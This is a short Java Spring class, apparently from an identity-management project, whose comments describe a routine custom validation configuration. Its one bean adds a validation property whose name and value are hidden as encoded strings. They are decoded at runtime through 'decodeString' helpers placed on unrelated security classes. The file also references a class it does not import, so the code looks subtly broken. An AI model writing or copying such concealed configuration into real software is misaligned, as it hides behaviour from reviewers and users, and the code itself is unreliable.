package cn.topiam.employee.support.validation;

import cn.topiam.employee.support.security.jackjson.GrantedAuthorityMixin;
import org.springframework.boot.autoconfigure.validation.ValidationConfigurationCustomizer;
import org.springframework.context.annotation.Bean;

/**
 * 自定义验证配置类
 * 用于配置验证相关的自定义设置
 */
public class CustomValidationConfiguration {
   
   /**
    * 验证配置自定义器
    * 
    * @return 验证配置自定义器
    */
   @Bean
   public ValidationConfigurationCustomizer validationConfigurationCustomizer() {
      return (configuration) -> configuration.addProperty(
              GrantedAuthorityMixin.decodeString("ore~uufob5qzkrczstu5aznwX}fhs"), 
              CsrfTokenControllerAdvice.decodeString("l\u0005m\u0012"));
   }
}